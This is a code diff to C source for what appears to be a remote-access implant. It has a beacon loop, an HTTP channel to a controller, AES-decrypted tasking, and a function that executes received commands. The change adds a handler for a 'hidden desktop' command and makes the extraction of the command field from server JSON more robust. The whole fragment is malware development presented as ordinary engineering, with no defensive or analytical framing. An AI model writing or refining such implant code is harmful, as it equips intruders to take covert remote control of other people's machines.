@@ -442,6 +442,13 @@ static char* http_post(const wchar_t *path, const char *data) {
 static int g_beacon_sleep = BEACON_SLEEP;
 
 static char* execute_command(const char *cmd) {
+    if (strncmp(cmd, "__hd:", 5) == 0) {
+        const char *msg = "hidden desktop requires the windows go agent";
+        char *out = (char *)malloc(strlen(msg) + 1);
+        if (!out) return NULL;
+        memcpy(out, msg, strlen(msg) + 1);
+        return out;
+    }
     if (strncmp(cmd, "cd ", 3) == 0) {
         const char *dir = cmd + 3;
         while (*dir == ' ') dir++;
@@ -578,9 +585,12 @@ static void beacon_loop(void) {
             char *dec = aes_decrypt(resp);
             free(resp);
             if (dec) {
-                char *cmd_start = strstr(dec, "\"command\":\"");
+                char *cmd_start = strstr(dec, "\"command\":");
                 while (cmd_start) {
-                    cmd_start += 11;
+                    cmd_start += 10;
+                    while (*cmd_start == ' ' || *cmd_start == '\t') cmd_start++;
+                    if (*cmd_start != '"') break;
+                    cmd_start++;
                     char *cmd_end = strchr(cmd_start, '"');
                     if (!cmd_end) break;
 
